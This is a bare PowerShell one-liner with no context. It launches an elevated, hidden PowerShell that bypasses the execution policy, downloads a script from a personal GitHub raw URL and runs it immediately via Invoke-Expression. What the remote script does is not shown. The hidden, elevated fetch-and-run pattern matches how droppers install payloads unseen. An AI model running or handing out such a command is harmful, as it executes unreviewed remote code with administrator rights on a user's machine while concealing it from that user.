```bash
Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/unme004/vm/main/setup.ps1 | iex"'
```
